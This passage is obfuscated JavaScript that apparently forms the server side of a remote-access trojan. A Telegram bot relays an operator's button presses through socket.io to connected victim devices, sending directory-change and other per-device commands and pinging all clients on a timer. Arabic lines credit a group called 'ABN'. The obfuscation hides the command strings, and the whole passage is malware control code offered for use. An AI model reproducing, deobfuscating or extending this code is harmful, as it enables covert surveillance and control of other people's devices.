                    bot[_0x20e6a4(0x369) + 'e'](data['id'], _0x5e9760[_0x20e6a4(0x3d5)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                        'parse_mode': _0x5e9760[_0x20e6a4(0x25d)],
                        'reply_markup': {
                            'keyboard': [
                                [
                                    _0x5e9760[_0x20e6a4(0x248)],
                                    _0x5e9760[_0x20e6a4(0x380)]
                                ],
                                [_0x5e9760[_0x20e6a4(0x2ea)]]
                            ],
                            'resize_keyboard': !![]
                        }
                    });
                    continue;
                case '2':
                    appData[_0x20e6a4(0x319)](_0x5e9760[_0x20e6a4(0x26e)]);
                    continue;
                case '3':
                    io['to'](_0x4bed83)[_0x20e6a4(0x391)](_0x5e9760[_0x20e6a4(0x3ba)], {
                        'request': _0x5e9760[_0x20e6a4(0x308)],
                        'extras': [{
                                'key': _0x5e9760[_0x20e6a4(0x290)],
                                'value': _0x5f4d18
                            }]
                    });
                    continue;
                case '4':
                    console[_0x20e6a4(0x3b1)](_0x5f4d18);
                    continue;
                }
                break;
            }
        });
    }
}), bot['on'](_0x286428(0x363) + _0x286428(0x329), _0x3990bc => {
    const _0x36fd64 = _0x286428, _0x5a96e4 = {
            'ySPWG': function (_0x513e67, _0x32e4a2) {
                return _0x513e67 === _0x32e4a2;
            },
            'RXAGd': _0x36fd64(0x306) + _0x36fd64(0x31e),
            'XjzKl': _0x36fd64(0x377),
            'sThJb': function (_0x3990a1, _0x369a30) {
                return _0x3990a1 === _0x369a30;
            },
            'QQvVe': _0x36fd64(0x298),
            'uRMLo': _0x36fd64(0x3bf),
            'hLifc': _0x36fd64(0x319),
            'KyKEn': function (_0x3f43a7, _0x32849b) {
                return _0x3f43a7 === _0x32849b;
            },
            'ARnlz': function (_0x32c89e, _0x3f35bf) {
                return _0x32c89e === _0x3f35bf;
            },
            'ADLUD': function (_0x15dc24, _0x144c4e) {
                return _0x15dc24 === _0x144c4e;
            },
            'bXPZq': _0x36fd64(0x312),
            'HMTET': _0x36fd64(0x3c8) + _0x36fd64(0x29c),
            'RoMMP': _0x36fd64(0x25b) + _0x36fd64(0x29c),
            'Kbmhr': _0x36fd64(0x364)
        };
    console[_0x36fd64(0x3b1)](_0x3990bc);
    let _0x1cfa71 = _0x3990bc[_0x36fd64(0x26f)], _0x4bf207 = _0x1cfa71[_0x36fd64(0x1f3)]('|')[0x438 + 0x160f * -0x1 + 0x11d7], _0x4286e1 = _0x1cfa71[_0x36fd64(0x1f3)]('|')[-0x11 * -0x25 + -0xa98 + 0x824], _0x2e1f83 = _0x4286e1[_0x36fd64(0x1f3)]('-')[-0x1b * 0x76 + 0x1b48 + 0x6 * -0x279], _0x129c1f = _0x4286e1[_0x36fd64(0x1f3)]('-')[-0x7 * -0x2d4 + -0x7 * -0x4dd + -0x35d6];
    _0x5a96e4[_0x36fd64(0x3d3)](_0x2e1f83, _0x5a96e4[_0x36fd64(0x1fb)]) && io[_0x36fd64(0x3c1)][_0x36fd64(0x3c1)][_0x36fd64(0x35e)]((_0x322441, _0x5bbb31, _0x7c5936) => {
        const _0x399d58 = _0x36fd64;
        _0x5a96e4[_0x399d58(0x3d3)](_0x322441[_0x399d58(0x3a6)], _0x4bf207) && io['to'](_0x5bbb31)[_0x399d58(0x391)](_0x5a96e4[_0x399d58(0x2b3)], {
            'request': _0x5a96e4[_0x399d58(0x1fb)],
            'extras': []
        });
    }), _0x5a96e4[_0x36fd64(0x293)](_0x2e1f83, 'cd') && io[_0x36fd64(0x3c1)][_0x36fd64(0x3c1)][_0x36fd64(0x35e)]((_0x3de87c, _0x59b20d, _0x56e269) => {
        const _0x7f2033 = _0x36fd64;
        _0x5a96e4[_0x7f2033(0x333)](_0x3de87c[_0x7f2033(0x3a6)], _0x4bf207) && io['to'](_0x59b20d)[_0x7f2033(0x391)](_0x5a96e4[_0x7f2033(0x2b3)], {
            'request': 'cd',
            'extras': [{
                    'key': _0x5a96e4[_0x7f2033(0x28b)],
                    'value': _0x129c1f
                }]
        });
    }), _0x5a96e4[_0x36fd64(0x384)](_0x2e1f83, _0x5a96e4[_0x36fd64(0x246)]) && io[_0x36fd64(0x3c1)][_0x36fd64(0x3c1)][_0x36fd64(0x35e)]((_0x5c3d87, _0x2e5d91, _0x1a8008) => {
        const _0x37ce1b = _0x36fd64;
        _0x5a96e4[_0x37ce1b(0x333)](_0x5c3d87[_0x37ce1b(0x3a6)], _0x4bf207) && io['to'](_0x2e5d91)[_0x37ce1b(0x391)](_0x5a96e4[_0x37ce1b(0x2b3)], {
            'request': _0x5a96e4[_0x37ce1b(0x246)],
            'extras': [{
                    'key': _0x5a96e4[_0x37ce1b(0x28b)],
                    'value': _0x129c1f
                }]
        });
    }), _0x5a96e4[_0x36fd64(0x293)](_0x2e1f83, _0x5a96e4[_0x36fd64(0x328)]) && io[_0x36fd64(0x3c1)][_0x36fd64(0x3c1)][_0x36fd64(0x35e)]((_0x28742e, _0x59e6b3, _0x16f3f9) => {
        const _0x23ee0a = _0x36fd64;
        _0x5a96e4[_0x23ee0a(0x333)](_0x28742e[_0x23ee0a(0x3a6)], _0x4bf207) && io['to'](_0x59e6b3)[_0x23ee0a(0x391)](_0x5a96e4[_0x23ee0a(0x2b3)], {
            'request': _0x5a96e4[_0x23ee0a(0x328)],
            'extras': [{
                    'key': _0x5a96e4[_0x23ee0a(0x28b)],
                    'value': _0x129c1f
                }]
        });
    }), _0x5a96e4[_0x36fd64(0x261)](_0x2e1f83, _0x5a96e4[_0x36fd64(0x31c)]) && bot[_0x36fd64(0x307) + _0x36fd64(0x305)](_0x36fd64(0x394) + _0x36fd64(0x234) + '\x20' + _0x129c1f + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
        'chat_id': data['id'],
        'message_id': _0x3990bc[_0x36fd64(0x245)][_0x36fd64(0x3dd)],
        'reply_markup': {
            'inline_keyboard': [[
                    {
                        'text': _0x5a96e4[_0x36fd64(0x386)],
                        'callback_data': _0x4bf207 + _0x36fd64(0x36d) + _0x129c1f
                    },
                    {
                        'text': _0x5a96e4[_0x36fd64(0x3dc)],
                        'callback_data': _0x4bf207 + _0x36fd64(0x228) + _0x129c1f
                    }
                ]]
        },
        'parse_mode': _0x5a96e4[_0x36fd64(0x3d9)]
    });
}), setInterval(() => {
    const _0x4c8d8c = _0x286428, _0x57cf5b = { 'CCUAs': _0x4c8d8c(0x3e7) };
    io[_0x4c8d8c(0x3c1)][_0x4c8d8c(0x3c1)][_0x4c8d8c(0x35e)]((_0x2d2cc4, _0x2a4d9c, _0x415ba4) => {
        const _0x2e535f = _0x4c8d8c;
        io['to'](_0x2a4d9c)[_0x2e535f(0x391)](_0x57cf5b[_0x2e535f(0x40a)], {});
    });
}, 0x23a4 + -0x1 * -0x25a + 0x11 * -0x116), server[_0x286428(0x239)](4000, () => {
    const _0x8ee2dc = _0x286428, _0x10d5ed = { 'hDJBw': _0x8ee2dc(0x334) + _0x8ee2dc(0x1f4) + '00' + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』' };
    console[_0x8ee2dc(0x3b1)](_0x10d5ed[_0x8ee2dc(0x2de)]);
});